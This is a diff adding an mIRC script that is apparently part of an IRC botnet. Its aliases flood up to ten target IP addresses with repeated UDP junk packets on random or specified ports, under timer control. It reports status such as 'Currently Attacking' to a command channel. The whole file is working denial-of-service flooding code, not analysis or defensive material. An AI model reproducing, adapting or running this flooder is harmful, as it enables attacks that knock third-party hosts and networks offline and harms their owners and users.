@@ -1,0 +1,37 @@
+alias Mudp  { if $1 = stop { .timermudp off | unset %Mnum | msg %cc 1[Mass Packeting]: stopped! } | if $3 = $null { return } |  if $timer(mudp).com != $null { msg %cc 1[Error]: Currently flooding: $gettok($timer(mudp).com,3,32)  | return } | .msg %cc 1[Sending]:  $+ $1 $+  bytes to:  $+ $gettok($2,1,45) $gettok($2,2,45) $gettok($2,3,45) $gettok($2,4,45) $gettok($2,5,45) $gettok($2,6,45) $gettok($2,7,45) $gettok($2,8,45) $gettok($2,9,45) $gettok($2,10,45) $+  on Port:  $+ $3 $+  | set %Mnum 0 | set %limit $gettok($2,0,45) | .timermudp -m 0 60 Mdope $1 $2 $3 }
+alias Mdope { if $3 = $null { goto done } | :loop | if %Mnum >= $1 { goto done } | inc %Mnum 2 
+  sockudp Mudp1 $gettok($2,1,45) $r(1,65000) $str(âô_6ÜµKTE_}“‘²,67)
+  if 1 == %limit { return }
+  sockudp Mudp2 $gettok($2,2,45) $r(1,65000) $str(!@#$%^&*()_+|,50)
+  if 2 == %limit { return }
+  sockudp Mudp3 $gettok($2,3,45) $r(1,65000) $str(@,920)
+  if 3 == %limit { return }
+  sockudp Mudp4 $gettok($2,4,45) $r(1,65000) $str(0010110,134) 
+  if 4 == %limit { return }
+  sockudp Mudp5 $gettok($2,5,45) $r(1,65000) $str(Pong,200)
+  if 5 == %limit { return }
+  sockudp Mudp6 $gettok($2,6,45) $r(1,65000) $str(Tw1st,189)
+  if 6 == %limit { return }
+  sockudp Mudp7 $gettok($2,7,45) $r(1,65000) $str(*,350)
+  if 7 == %limit { return }
+  sockudp Mudp8 $gettok($2,8,45) $r(1,65000) $str(link,200) 
+  if 8 == %limit { return }
+  sockudp Mudp9 $gettok($2,9,45) $r(1,65000) $str(Tw1st,189)
+  if 9 == %limit { return }
+  sockudp Mudp10 $gettok($2,10,45) $r(1,65000) $str(@,920)
+  if 10 == %limit { return }
+  return | :done | /.msg %cc 1[Packeting]: finished! | .timermudp off | unset %Mnum* 
+}
+alias Tw1stStart  { if $1 = STOP { .timerTw1st off | unset %gnum | msg %cc [Packeting] Halted } | if $3 = $null { return } |  if $timer(Tw1st).com != $null { msg %cc 4ERROR!1 Currently Attacking: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %cc sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ ) |  set %gnum 0 |  .timerTw1st -m 0 400 Tw1st1t $1 $2 $3 }
+alias Tw1st1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
+  sockudp Tw1st $2 $3 $str(âô_6ÜµKTE_}“‘²,67)
+  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)
+  sockudp Tw3st $2 $3 $str(@,920)
+  sockudp Tw4st $2 $3 $str(0010110,134) 
+  sockudp Tw5st $2 $3 $str(Pong,200)
+  sockudp Tw6st $2 $3 $str(Tw1st,189)
+  sockudp Tw7st $2 $3 $str(*,350)
+  sockudp Tw8st $2 $3 $str(link,200)
+  sockudp Tw9st $2 $3 $str(Tw1st,189)
+  return |  :done | //msg %cc [Packeting] finished | .timerTw1st off | unset %gnum 
+}
